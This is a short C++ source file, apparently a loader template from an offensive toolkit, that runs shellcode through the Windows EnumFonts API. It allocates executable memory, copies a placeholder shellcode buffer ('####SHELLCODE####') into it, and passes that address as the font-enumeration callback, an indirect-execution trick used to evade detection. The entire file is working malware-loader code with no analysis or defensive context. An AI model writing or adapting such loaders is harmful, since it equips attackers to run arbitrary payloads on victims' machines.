/**
 * EnumFonts execution primitive
Editor: Thomas X Meng
***/

#include <windows.h>
#include <cstdio>
//gdi32.lib
#pragma comment(lib, "gdi32.lib")


unsigned char magiccode[] = ####SHELLCODE####;



int main(int argc, char *argv[]) 
{
	SIZE_T magicSize = sizeof(magiccode);
	LPVOID magicAddress = VirtualAlloc(NULL, magicSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(GetCurrentProcess(), magicAddress, magiccode, magicSize, NULL);
	
	// EnumFonts(GetDC(0), (LPCWSTR)0, (FONTENUMPROC)(char*)magiccode, 0);
    EnumFonts(GetDC(0), (LPCSTR)0, (FONTENUMPROC)(char*)magicAddress, 0);



	return 0;
}